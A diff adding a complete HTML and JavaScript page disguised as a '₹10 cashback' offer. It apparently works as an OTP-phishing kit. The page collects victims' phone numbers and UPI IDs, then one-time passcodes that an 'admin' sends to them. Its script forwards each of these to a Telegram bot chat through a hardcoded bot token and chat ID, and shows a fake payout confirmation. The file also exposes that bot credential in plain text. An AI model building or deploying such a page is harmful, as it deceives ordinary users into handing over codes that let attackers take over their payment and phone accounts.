@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cashback Offer - ₹10</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0a0a0f; --card: #12121a; --card2: #1a1a26;
+      --accent: #00e5ff; --accent2: #7b2fff;
+      --green: #00e676; --red: #ff3d71; --gold: #ffd600;
+      --text: #f0f0ff; --muted: #6b6b8a;
+      --border: rgba(255,214,0,0.12);
+    }
+    body { background: var(--bg); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Nunito', sans-serif; color: var(--text); padding: 20px; overflow-x: hidden; }
+    .blob { position: fixed; border-radius: 50%; filter: blur(80px); opacity: 0.15; pointer-events: none; z-index: 0; }
+    .blob1 { width: 400px; height: 400px; background: var(--accent2); top: -100px; left: -100px; animation: blobMove 8s ease-in-out infinite alternate; }
+    .blob2 { width: 300px; height: 300px; background: var(--gold); bottom: -80px; right: -80px; animation: blobMove 10s ease-in-out infinite alternate-reverse; }
+    @keyframes blobMove { from { transform: translate(0,0) scale(1); } to { transform: translate(40px,40px) scale(1.1); } }
+
+    .wrapper { position: relative; z-index: 1; width: 100%; max-width: 400px; }
+    
+    .header { text-align: center; margin-bottom: 16px; animation: fadeDown 0.5s ease; }
+    .header-title { font-family: 'Bebas Neue', sans-serif; font-size: 52px; letter-spacing: 4px; background: linear-gradient(135deg, var(--gold), #ff9800); -webkit-background-clip: text; -webkit-text-fill-color: transparent; line-height: 1; }
+    .header-sub { font-size: 13px; color: var(--muted); margin-top: 6px; }
+    @keyframes fadeDown { from { opacity: 0; transform: translateY(-16px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+    .cashback-banner { background: linear-gradient(135deg, #1a1200, #2a1e00); border: 1.5px solid rgba(255,214,0,0.4); border-radius: 18px; padding: 16px 20px; margin-bottom: 20px; text-align: center; position: relative; overflow: hidden; animation: fadeUp 0.35s ease; }
+    .cashback-banner::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 50% 0%, rgba(255,214,0,0.12) 0%, transparent 70%); pointer-events: none; }
+    .cb-tag { font-size: 10px; font-weight: 800; letter-spacing: 0.2em; text-transform: uppercase; color: var(--gold); opacity: 0.8; margin-bottom: 4px; }
+    .cb-amount { font-family: 'Bebas Neue', sans-serif; font-size: 40px; letter-spacing: 3px; background: linear-gradient(135deg, var(--gold), #ff9800); -webkit-background-clip: text; -webkit-text-fill-color: transparent; line-height: 1.1; }
+    .cb-sub { font-size: 12px; color: rgba(255,214,0,0.7); margin-top: 4px; font-weight: 700; }
+    .cb-badges { display: flex; justify-content: center; gap: 8px; margin-top: 10px; flex-wrap: wrap; }
+    .cb-badge { background: rgba(255,214,0,0.12); border: 1px solid rgba(255,214,0,0.25); border-radius: 99px; padding: 4px 12px; font-size: 11px; font-weight: 800; color: var(--gold); }
+
+    .card { background: var(--card); border-radius: 24px; padding: 30px 28px; border: 1px solid var(--border); box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04); animation: fadeUp 0.4s ease; }
+    .step-label { font-size: 11px; font-weight: 800; letter-spacing: 0.15em; text-transform: uppercase; color: var(--gold); margin-bottom: 6px; }
+    .step-title { font-size: 22px; font-weight: 800; margin-bottom: 20px; color: var(--text); }
+
+    .field { margin-bottom: 14px; }
+    .field label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 7px; }
+    .field input { width: 100%; padding: 13px 16px; background: var(--card2); border: 1px solid var(--border); border-radius: 12px; color: var(--text); font-size: 15px; font-family: 'Nunito', sans-serif; font-weight: 600; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .field input:focus { border-color: var(--gold); box-shadow: 0 0 0 3px rgba(255,214,0,0.08); }
+    .field input::placeholder { color: var(--muted); font-weight: 400; }
+    .token-input { font-family: 'Bebas Neue', sans-serif !important; font-size: 18px !important; letter-spacing: 2px !important; color: var(--gold) !important; text-transform: uppercase; }
+
+    /* OTP Styles */
+    .otp-type-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 8px; display: block; }
+    .otp-type-row { display: flex; gap: 8px; margin-bottom: 18px; }
+    .otp-type-btn { flex: 1; padding: 10px 0; border: 1px solid var(--border); border-radius: 10px; background: var(--card2); color: var(--muted); font-family: 'Nunito', sans-serif; font-size: 13px; font-weight: 800; cursor: pointer; transition: all 0.2s; text-align: center; }
+    .otp-type-btn:hover { border-color: var(--gold); color: var(--gold); }
+    .otp-type-btn.active { background: linear-gradient(135deg, var(--gold), #ff9800); color: #000; border-color: transparent; transform: scale(1.04); }
+    .otp-row { display: flex; gap: 8px; margin-top: 8px; }
+    .otp-row input { flex: 1; padding: 14px 0; text-align: center; font-size: 22px; font-weight: 800; background: var(--card2); border: 1px solid var(--border); border-radius: 12px; color: var(--gold); font-family: 'Bebas Neue', sans-serif; letter-spacing: 2px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .otp-row input:focus { border-color: var(--gold); box-shadow: 0 0 0 3px rgba(255,214,0,0.1); }
+
+    /* Waiting */
+    .waiting-box { text-align: center; padding: 12px 0 4px; }
+    .waiting-dots span { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--gold); margin: 0 3px; animation: dotBounce 1.2s ease-in-out infinite; }
+    .waiting-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .waiting-dots span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes dotBounce { 0%,80%,100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1); opacity: 1; } }
+    .waiting-text { font-size: 12px; color: var(--muted); margin-top: 8px; font-weight: 700; }
+
+    /* Buttons */
+    .btn { width: 100%; padding: 15px; margin-top: 12px; border: none; border-radius: 12px; font-size: 15px; font-weight: 800; font-family: 'Nunito', sans-serif; cursor: pointer; transition: transform 0.15s, opacity 0.2s; }
+    .btn:hover { opacity: 0.9; }
+    .btn:active { transform: scale(0.98); }
+    .btn:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+    .btn-primary { background: linear-gradient(135deg, var(--gold), #ff9800); color: #000; }
+    .btn-ghost { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: var(--muted); }
+    .btn-red { background: linear-gradient(135deg, var(--red), #c62828); color: #fff; }
+    .btn-success { background: linear-gradient(135deg, var(--green), #00a854); color: #000; }
+
+    .msg { font-size: 12px; font-weight: 700; margin-top: 10px; min-height: 18px; }
+    .msg.error { color: var(--red); }
+    .msg.success { color: var(--green); }
+
+    /* Popups */
+    .popup-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.78); display: flex; align-items: center; justify-content: center; z-index: 200; animation: fadeIn 0.2s ease; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .popup-box { background: var(--card); border-radius: 24px; padding: 32px 28px; max-width: 320px; width: 90%; text-align: center; animation: popIn 0.3s cubic-bezier(0.34,1.56,0.64,1); border: 1px solid var(--border); }
+    @keyframes popIn { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .popup-icon { font-size: 52px; margin-bottom: 12px; }
+    .popup-title { font-family: 'Bebas Neue', sans-serif; font-size: 28px; letter-spacing: 2px; margin-bottom: 8px; }
+    .popup-sub { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 20px; }
+
+    /* Success card */
+    .success-icon { width: 72px; height: 72px; background: linear-gradient(135deg, var(--gold), #ff9800); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 34px; margin: 0 auto 18px; animation: popIn 0.45s cubic-bezier(0.34,1.56,0.64,1); }
+    .success-title { font-family: 'Bebas Neue', sans-serif; font-size: 34px; letter-spacing: 3px; color: var(--gold); text-align: center; margin-bottom: 10px; }
+    .success-sub { font-size: 14px; color: var(--muted); text-align: center; line-height: 1.7; }
+    .success-amount { display: inline-block; margin: 15px 0; background: linear-gradient(135deg, rgba(255,214,0,0.2), rgba(255,152,0,0.15)); border: 1.5px solid rgba(255,214,0,0.4); border-radius: 14px; padding: 12px 28px; font-family: 'Bebas Neue', sans-serif; font-size: 36px; letter-spacing: 4px; color: var(--gold); }
+
+    .hidden { display: none !important; }
+    
+    .info-box { background: rgba(255,214,0,0.05); border: 1px solid rgba(255,214,0,0.15); border-radius: 12px; padding: 12px 14px; font-size: 12px; color: var(--muted); margin-bottom: 16px; line-height: 1.6; }
+    .info-box strong { color: var(--gold); }
+    
+    /* Connection status */
+    .conn-status { position: fixed; top: 10px; left: 10px; padding: 6px 12px; background: rgba(0,0,0,0.8); border-radius: 20px; font-size: 11px; font-weight: 700; z-index: 100; border: 1px solid var(--border); }
+    .conn-status.connected { color: var(--green); border-color: var(--green); }
+    .conn-status.disconnected { color: var(--red); border-color: var(--red); }
+  </style>
+</head>
+<body>
+<!-- Connection Status -->
+<div class="conn-status disconnected" id="connStatus">● Bot Connecting...</div>
+
+<div class="blob blob1"></div>
+<div class="blob blob2"></div>
+
+<div class="wrapper">
+  <!-- Support -->
+  <div style="position: absolute; top: -60px; right: 0; z-index: 10;">
+    <a href="https://www.instagram.com/bravooo.fx" target="_blank" style="display: flex; align-items: center; gap: 6px; padding: 8px 14px; background: linear-gradient(135deg, #e1306c, #833ab4); border-radius: 99px; color: #fff; font-family: 'Nunito', sans-serif; font-size: 12px; font-weight: 800; text-decoration: none;">📸 Support</a>
+  </div>
+
+  <div class="header">
+    <div class="header-title">CASHBACK</div>
+    <div class="header-sub">Verify token & OTP to claim ₹10 instantly</div>
+  </div>
+
+  <!-- Banner -->
+  <div class="cashback-banner">
+    <div class="cb-tag">🎯 Guaranteed Reward</div>
+    <div class="cb-amount">₹10 FLAT</div>
+    <div class="cb-sub">Token + OTP Verification Required</div>
+    <div class="cb-badges">
+      <span class="cb-badge">🔑 Token Locked</span>
+      <span class="cb-badge">🔐 OTP Secured</span>
+      <span class="cb-badge">⚡ 24h Payout</span>
+    </div>
+  </div>
+
+  <!-- STEP 1: Token + Details -->
+  <div class="card" id="step1">
+    <div class="step-label">Step 1 of 3</div>
+    <div class="step-title">Enter Details</div>
+    
+    <div class="field">
+      <label>Access Token</label>
+      <input type="text" id="token" class="token-input" placeholder="ENTER TOKEN" maxlength="20" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Mobile Number</label>
+      <input type="tel" id="phone" placeholder="10-digit number" maxlength="10">
+    </div>
+    <div class="field">
+      <label>UPI ID</label>
+      <input type="text" id="upi" placeholder="yourname@upi">
+    </div>
+    
+    <div class="info-box">
+      ℹ️ <strong>Token Usage:</strong> One token can only be used once. Contact admin for new tokens.
+    </div>
+    
+    <div class="msg error" id="err1"></div>
+    <button class="btn btn-primary" id="submitBtn">Get ₹10 Cashback →</button>
+  </div>
+
+  <!-- STEP 2: OTP Verification -->
+  <div class="card hidden" id="step2">
+    <div class="step-label">Step 2 of 3</div>
+    <div class="step-title">Verify OTP</div>
+    
+    <div class="info-box">
+      ✅ Token Validated<br>
+      <strong>Wait for OTP</strong> — Admin will send it to your number shortly.
+    </div>
+
+    <!-- OTP Type selector -->
+    <span class="otp-type-label">Select OTP Type</span>
+    <div class="otp-type-row">
+      <button class="otp-type-btn active" data-digits="4">4 Digit</button>
+      <button class="otp-type-btn" data-digits="5">5 Digit</button>
+      <button class="otp-type-btn" data-digits="6">6 Digit</button>
+    </div>
+
+    <div class="field">
+      <label id="otpBoxLabel">4-Digit OTP</label>
+      <div class="otp-row" id="otpBoxes"></div>
+    </div>
+
+    <div class="msg error" id="err2"></div>
+
+    <div class="waiting-box hidden" id="waitingBox">
+      <div class="waiting-dots"><span></span><span></span><span></span></div>
+      <div class="waiting-text">Verifying with admin...</div>
+    </div>
+
+    <button class="btn btn-primary" id="verifyOtpBtn">Submit OTP →</button>
+    <button class="btn btn-ghost" id="backBtn">← Back</button>
+  </div>
+
+  <!-- STEP 3: Success -->
+  <div class="card hidden" id="step3">
+    <div class="success-icon">🏆</div>
+    <div class="success-title">VERIFIED!</div>
+    <div class="success-sub">
+      Your token and OTP are confirmed!<br>
+      <div class="success-amount">₹10</div><br>
+      Cashback approved for:<br>
+      <strong style="color: var(--text);" id="displayUpiFinal"></strong>
+    </div>
+    <div style="margin-top: 20px; padding: 15px; background: rgba(0,230,118,0.1); border: 1px solid rgba(0,230,118,0.3); border-radius: 12px; font-size: 13px; color: var(--green); line-height: 1.6;">
+      ⏱️ <strong>You will receive your amount within 24 hours</strong><br>
+      via UPI transfer to your registered ID.
+    </div>
+    <button class="btn btn-success" style="margin-top: 20px;" onclick="location.reload()">Claim Another</button>
+  </div>
+</div>
+
+<!-- POPUP: Wrong Token -->
+<div class="popup-overlay hidden" id="wrongTokenPopup">
+  <div class="popup-box">
+    <div class="popup-icon">❌</div>
+    <div class="popup-title" style="color: var(--red)">INVALID TOKEN</div>
+    <div class="popup-sub">This token is invalid, expired, or already used. Please contact admin for a valid token.</div>
+    <button class="btn btn-red" id="closeWrongToken">OK</button>
+  </div>
+</div>
+
+<!-- POPUP: Wrong OTP -->
+<div class="popup-overlay hidden" id="wrongOtpPopup">
+  <div class="popup-box">
+    <div class="popup-icon">❌</div>
+    <div class="popup-title" style="color: var(--red)">WRONG OTP</div>
+    <div class="popup-sub">The OTP you entered is incorrect. Please check and try again.</div>
+    <button class="btn btn-red" id="closeWrongOtp">Try Again</button>
+  </div>
+</div>
+
+<!-- POPUP: Banned -->
+<div class="popup-overlay hidden" id="bannedPopup">
+  <div class="popup-box">
+    <div class="popup-icon">🚫</div>
+    <div class="popup-title" style="color: var(--red)">ACCESS DENIED</div>
+    <div class="popup-sub">This number has been <strong style="color: var(--red)">banned</strong> due to suspicious activity.</div>
+    <a href="https://www.instagram.com/bravooo.fx" target="_blank" style="display: block; width: 100%; padding: 13px; margin-top: 14px; border-radius: 12px; font-size: 14px; font-weight: 800; font-family: 'Nunito', sans-serif; background: linear-gradient(135deg, #e1306c, #833ab4); color: #fff; text-decoration: none; text-align: center;">📸 Contact Support</a>
+  </div>
+</div>
+
+<!-- POPUP: Already Used Token -->
+<div class="popup-overlay hidden" id="usedTokenPopup">
+  <div class="popup-box">
+    <div class="popup-icon">🔒</div>
+    <div class="popup-title" style="color: var(--red)">TOKEN USED</div>
+    <div class="popup-sub">This token has already been claimed. Each token can only be used once.</div>
+    <button class="btn btn-ghost" id="closeUsedToken">OK</button>
+  </div>
+</div>
+
+<script>
+  // ===== YOUR CREDENTIALS =====
+  const BOT_TOKEN = '8406944315:AAHuTEsp0frSmz-anI0FWRxgQhG6Un_lyDA';
+  const ADMIN_CHAT_ID = '1295046984';
+  const CASHBACK_AMOUNT = 10;
+  
+  // ===== STATE =====
+  let currentToken = '';
+  let currentPhone = '';
+  let currentUpi = '';
+  let pendingMsgId = null;
+  let currentDigits = 4;
+  let isPolling = false;
+  let pollTimer = null;
+  let pollingOffset = 0;
+
+  // ===== STORAGE KEYS =====
+  const STORAGE_KEYS = {
+    VALID_TOKENS: 'cashback_valid_tokens_v3',
+    USED_TOKENS: 'cashback_used_tokens_v3',
+    BANNED_USERS: 'cashback_banned_users_v3'
+  };
+
+  // ===== INIT =====
+  function init() {
+    // Set default tokens if none exist
+    const existing = localStorage.getItem(STORAGE_KEYS.VALID_TOKENS);
+    if (!existing) {
+      const defaultTokens = ['SAVE10', 'CASH20', 'FREE50'];
+      localStorage.setItem(STORAGE_KEYS.VALID_TOKENS, JSON.stringify(defaultTokens));
+      console.log('Default tokens created:', defaultTokens);
+    }
+    
+    // Start polling immediately for admin commands
+    startPolling();
+    
+    // Test connection
+    testConnection();
+  }
+
+  async function testConnection() {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+      const data = await res.json();
+      if (data.ok) {
+        console.log('Bot connected:', data.result.username);
+        updateConnectionStatus(true);
+      } else {
+        updateConnectionStatus(false);
+      }
+    } catch (e) {
+      updateConnectionStatus(false);
+    }
+  }
+
+  // ===== TELEGRAM FUNCTIONS =====
+  async function sendTelegram(text, replyMarkup) {
+    try {
+      const body = { 
+        chat_id: ADMIN_CHAT_ID, 
+        text: text, 
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      };
+      if (replyMarkup) body.reply_markup = replyMarkup;
+      
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      const data = await res.json();
+      if (!data.ok) {
+        console.error('Telegram API Error:', data);
+      }
+      return data;
+    } catch (e) {
+      console.error('Send failed:', e);
+      return { ok: false, error: e.message };
+    }
+  }
+
+  async function answerCallback(callbackId, text) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          callback_query_id: callbackId, 
+          text: text, 
+          show_alert: true 
+        })
+      });
+    } catch (e) {
+      console.error('Answer callback failed:', e);
+    }
+  }
+
+  // ===== TOKEN MANAGEMENT =====
+  function getValidTokens() {
+    return JSON.parse(localStorage.getItem(STORAGE_KEYS.VALID_TOKENS) || '[]');
+  }
+
+  function getUsedTokens() {
+    return JSON.parse(localStorage.getItem(STORAGE_KEYS.USED_TOKENS) || '[]');
+  }
+
+  function addValidToken(token) {
+    const tokens = getValidTokens();
+    const upperToken = token.toUpperCase().trim();
+    if (!tokens.includes(upperToken)) {
+      tokens.push(upperToken);
+      localStorage.setItem(STORAGE_KEYS.VALID_TOKENS, JSON.stringify(tokens));
+      return true;
+    }
+    return false;
+  }
+
+  function markTokenAsUsed(token) {
+    const used = getUsedTokens();
+    const upperToken = token.toUpperCase().trim();
+    if (!used.includes(upperToken)) {
+      used.push(upperToken);
+      localStorage.setItem(STORAGE_KEYS.USED_TOKENS, JSON.stringify(used));
+    }
+  }
+
+  function isTokenValid(token) {
+    const valid = getValidTokens();
+    return valid.includes(token.toUpperCase().trim());
+  }
+
+  function isTokenUsed(token) {
+    const used = getUsedTokens();
+    return used.includes(token.toUpperCase().trim());
+  }
+
+  // ===== BAN SYSTEM =====
+  function getBannedUsers() {
+    return JSON.parse(localStorage.getItem(STORAGE_KEYS.BANNED_USERS) || '[]');
+  }
+
+  function banUser(phone, upi) {
+    const banned = getBannedUsers();
+    if (!banned.find(u => u.phone === phone)) {
+      banned.push({ phone, upi, date: new Date().toISOString() });
+      localStorage.setItem(STORAGE_KEYS.BANNED_USERS, JSON.stringify(banned));
+    }
+  }
+
+  function isUserBanned(phone, upi) {
+    const banned = getBannedUsers();
+    return banned.some(u => u.phone === phone || u.upi === upi);
+  }
+
+  function unbanUser(phone) {
+    let banned = getBannedUsers();
+    banned = banned.filter(u => u.phone !== phone);
+    localStorage.setItem(STORAGE_KEYS.BANNED_USERS, JSON.stringify(banned));
+  }
+
+  // ===== POLLING =====
+  async function pollForUpdates() {
+    if (!isPolling) return;
+    
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${pollingOffset}&limit=100&timeout=30`);
+      const data = await res.json();
+      
+      if (data.ok) {
+        if (data.result.length > 0) {
+          console.log('Received updates:', data.result.length);
+          
+          for (const update of data.result) {
+            pollingOffset = update.update_id + 1;
+            
+            // Handle Messages (Commands)
+            if (update.message && update.message.text) {
+              const text = update.message.text.trim();
+              const fromChat = update.message.chat.id.toString();
+              
+              console.log('Message from', fromChat, ':', text);
+              
+              // Only process commands from admin
+              if (fromChat === ADMIN_CHAT_ID) {
+                await handleCommand(text, update.message);
+              }
+            }
+            
+            // Handle Callback Queries
+            if (update.callback_query) {
+              await handleCallback(update.callback_query);
+            }
+          }
+        }
+      } else {
+        console.error('Telegram API error:', data);
+      }
+    } catch (e) {
+      console.error('Polling error:', e);
+    }
+    
+    // Continue polling
+    if (isPolling) {
+      pollTimer = setTimeout(pollForUpdates, 1000);
+    }
+  }
+
+  async function handleCommand(text, message) {
+    console.log('Processing command:', text);
+    
+    // Create Token
+    if (text.startsWith('/createtoken') || text.startsWith('/token')) {
+      const parts = text.split(' ');
+      if (parts.length < 2) {
+        await sendTelegram('❌ Usage: /createtoken TOKEN_NAME\nExample: /createtoken SAVE50');
+        return;
+      }
+      const newToken = parts[1].toUpperCase().trim();
+      if (newToken.length < 3) {
+        await sendTelegram('❌ Token must be at least 3 characters');
+        return;
+      }
+      
+      const added = addValidToken(newToken);
+      if (added) {
+        await sendTelegram(
+          `✅ <b>Token Created Successfully</b>\n\n` +
+          `🔑 Token: <code>${newToken}</code>\n` +
+          `📊 Total Valid Tokens: ${getValidTokens().length}\n` +
+          `❌ Used Tokens: ${getUsedTokens().length}\n\n` +
+          `Users can now claim cashback using this token.`
+        );
+      } else {
+        await sendTelegram(`⚠️ Token <code>${newToken}</code> already exists!`);
+      }
+    }
+    
+    // List Tokens
+    else if (text === '/tokens' || text === '/listtokens') {
+      const valid = getValidTokens();
+      const used = getUsedTokens();
+      const available = valid.filter(t => !used.includes(t));
+      
+      let msg = `📋 <b>Token Status</b>\n\n`;
+      msg += `✅ <b>Available (${available.length}):</b>\n`;
+      msg += available.length > 0 ? available.map(t => `<code>${t}</code>`).join('\n') : 'None';
+      msg += `\n\n❌ <b>Used (${used.length}):</b>\n`;
+      msg += used.length > 0 ? used.map(t => `<code>${t}</code>`).join('\n') : 'None';
+      
+      await sendTelegram(msg);
+    }
+    
+    // Ban List
+    else if (text === '/banlist') {
+      const banned = getBannedUsers();
+      if (banned.length === 0) {
+        await sendTelegram('📋 <b>Banned Users</b>\n\nNo users banned.');
+      } else {
+        const list = banned.map((u, i) => `${i+1}. 📱 ${u.phone} | 💳 ${u.upi}`).join('\n');
+        await sendTelegram(
+          `📋 <b>Banned Users (${banned.length})</b>\n\n${list}`,
+          { inline_keyboard: banned.map(u => [{ text: `🔓 Unban ${u.phone}`, callback_data: `unban_${u.phone}` }]) }
+        );
+      }
+    }
+    
+    // Start command
+    else if (text === '/start') {
+      await sendTelegram(
+        `🤖 <b>Cashback Bot Ready</b>\n\n` +
+        `Available Commands:\n` +
+        `• /createtoken [NAME] - Create new token\n` +
+        `• /tokens - List all tokens\n` +
+        `• /banlist - Show banned users\n\n` +
+        `Bot is listening for cashback requests...`
+      );
+    }
+  }
+
+  async function handleCallback(cb) {
+    const data = cb.data;
+    const cbId = cb.id;
+    const msgId = cb.message ? cb.message.message_id : null;
+    
+    // Handle Unban
+    if (data.startsWith('unban_')) {
+      const phone = data.replace('unban_', '');
+      unbanUser(phone);
+      await answerCallback(cbId, `✅ User ${phone} unbanned!`);
+      await sendTelegram(`✅ <b>Unbanned</b>\n📱 ${phone} has been removed from ban list.`);
+      return;
+    }
+    
+    // Handle OTP Verification (only if matches current session)
+    if (msgId === pendingMsgId) {
+      if (data === 'otp_correct') {
+        await answerCallback(cbId, '✅ OTP Verified! ₹10 approved.');
+        markTokenAsUsed(currentToken);
+        hide('step2');
+        show('step3');
+        document.getElementById('displayUpiFinal').textContent = currentUpi;
+        
+        await sendTelegram(
+          `✅ <b>Cashback Claimed Successfully</b>\n\n` +
+          `🔑 Token: <code>${currentToken}</code> (Marked as Used)\n` +
+          `📱 Phone: <code>${currentPhone}</code>\n` +
+          `💳 UPI: <code>${currentUpi}</code>\n` +
+          `💰 Amount: ₹${CASHBACK_AMOUNT}\n\n` +
+          `⏱️ <b>Status:</b> Pending (24h payout)`
+        );
+        
+      } else if (data === 'otp_wrong') {
+        await answerCallback(cbId, '❌ Wrong OTP marked!');
+        hide('step2');
+        showPopup('wrongOtpPopup');
+        
+      } else if (data === 'ban_user') {
+        await answerCallback(cbId, '🚫 User banned permanently!');
+        banUser(currentPhone, currentUpi);
+        hide('step2');
+        showPopup('bannedPopup');
+        
+        await sendTelegram(
+          `🚫 <b>User Banned</b>\n` +
+          `📱 ${currentPhone}\n` +
+          `💳 ${currentUpi}\n` +
+          `Reason: Wrong OTP / Suspicious activity`
+        );
+      }
+    }
+  }
+
+  function updateConnectionStatus(connected) {
+    const status = document.getElementById('connStatus');
+    if (connected) {
+      status.textContent = '● Bot Connected';
+      status.className = 'conn-status connected';
+    } else {
+      status.textContent = '● Bot Error';
+      status.className = 'conn-status disconnected';
+    }
+  }
+
+  function startPolling() {
+    if (isPolling) return;
+    isPolling = true;
+    console.log('Starting Telegram polling...');
+    
+    // Get latest offset first
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok && data.result.length > 0) {
+          pollingOffset = data.result[data.result.length - 1].update_id + 1;
+          console.log('Starting from offset:', pollingOffset);
+        }
+        pollForUpdates();
+      })
+      .catch(err => {
+        console.error('Failed to get initial offset:', err);
+        pollForUpdates();
+      });
+  }
+
+  // ===== UI HELPERS =====
+  function show(id) { document.getElementById(id).classList.remove('hidden'); }
+  function hide(id) { document.getElementById(id).classList.add('hidden'); }
+  function showPopup(id) { show(id); }
+  function hidePopup(id) { hide(id); }
+
+  // ===== OTP BUILDER =====
+  function buildOtpBoxes(digits) {
+    currentDigits = digits;
+    document.getElementById('otpBoxLabel').textContent = digits + '-Digit OTP';
+    const container = document.getElementById('otpBoxes');
+    container.innerHTML = '';
+    
+    for (let i = 0; i < digits; i++) {
+      const inp = document.createElement('input');
+      inp.type = 'tel';
+      inp.maxLength = 1;
+      inp.className = 'otp';
+      inp.id = 'o' + (i + 1);
+      inp.autocomplete = 'off';
+      container.appendChild(inp);
+    }
+    
+    const all = container.querySelectorAll('.otp');
+    all.forEach((input, i, arr) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && i < arr.length - 1) arr[i + 1].focus();
+      });
+      input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && i > 0) arr[i - 1].focus();
+      });
+    });
+  }
+
+  buildOtpBoxes(4);
+
+  document.querySelectorAll('.otp-type-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.otp-type-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      buildOtpBoxes(parseInt(btn.dataset.digits));
+    });
+  });
+
+  // ===== STEP 1 =====
+  document.getElementById('submitBtn').addEventListener('click', async () => {
+    const token = document.getElementById('token').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const upi = document.getElementById('upi').value.trim();
+    const err = document.getElementById('err1');
+    const btn = document.getElementById('submitBtn');
+    
+    err.textContent = '';
+    
+    if (!token || !phone || !upi) {
+      err.textContent = 'Please fill all fields.';
+      return;
+    }
+    if (phone.length !== 10 || isNaN(phone)) {
+      err.textContent = 'Enter valid 10-digit number.';
+      return;
+    }
+    if (!upi.includes('@')) {
+      err.textContent = 'Enter valid UPI ID.';
+      return;
+    }
+    
+    if (isUserBanned(phone, upi)) {
+      showPopup('bannedPopup');
+      return;
+    }
+    
+    if (!isTokenValid(token)) {
+      showPopup('wrongTokenPopup');
+      return;
+    }
+    if (isTokenUsed(token)) {
+      showPopup('usedTokenPopup');
+      return;
+    }
+    
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+    
+    currentToken = token;
+    currentPhone = phone;
+    currentUpi = upi;
+    
+    const tgRes = await sendTelegram(
+      `🔔 <b>New Cashback Request</b>\n\n` +
+      `🔑 <b>Token:</b> <code>${token}</code>\n` +
+      `📱 <b>Phone:</b> <code>${phone}</code>\n` +
+      `💳 <b>UPI:</b> <code>${upi}</code>\n` +
+      `💰 <b>Amount:</b> ₹${CASHBACK_AMOUNT}\n\n` +
+      `Send OTP to user and verify below:`,
+      {
+        inline_keyboard: [
+          [
+            { text: '✅ OTP Correct (Approve ₹10)', callback_data: 'otp_correct' },
+            { text: '❌ Wrong OTP', callback_data: 'otp_wrong' }
+          ],
+          [
+            { text: '🚫 Ban This User', callback_data: 'ban_user' }
+          ]
+        ]
+      }
+    );
+    
+    if (tgRes.ok) {
+      pendingMsgId = tgRes.result.message_id;
+      hide('step1');
+      show('step2');
+      document.getElementById('o1')?.focus();
+    } else {
+      err.textContent = 'Failed to connect. Check bot token.';
+      btn.disabled = false;
+      btn.textContent = 'Get ₹10 Cashback →';
+    }
+  });
+
+  // ===== STEP 2 =====
+  document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
+    const inputs = document.getElementById('otpBoxes').querySelectorAll('.otp');
+    let otp = '';
+    inputs.forEach(i => otp += i.value.trim());
+    const err = document.getElementById('err2');
+    const btn = document.getElementById('verifyOtpBtn');
+    
+    err.textContent = '';
+    
+    if (otp.length < currentDigits) {
+      err.textContent = `Enter all ${currentDigits} digits.`;
+      return;
+    }
+    
+    btn.disabled = true;
+    show('waitingBox');
+    
+    await sendTelegram(
+      `🔑 <b>OTP Submitted</b>\n\n` +
+      `📱 ${currentPhone}\n` +
+      `🔢 OTP: <code>${otp}</code>\n\n` +
+      `Waiting for admin verification...`
+    );
+    
+    btn.textContent = 'Waiting for admin...';
+  });
+
+  document.getElementById('backBtn').addEventListener('click', () => {
+    hide('step2');
+    show('step1');
+    document.getElementById('submitBtn').disabled = false;
+    document.getElementById('submitBtn').textContent = 'Get ₹10 Cashback →';
+  });
+
+  // ===== POPUP CLOSERS =====
+  document.getElementById('closeWrongToken').addEventListener('click', () => hidePopup('wrongTokenPopup'));
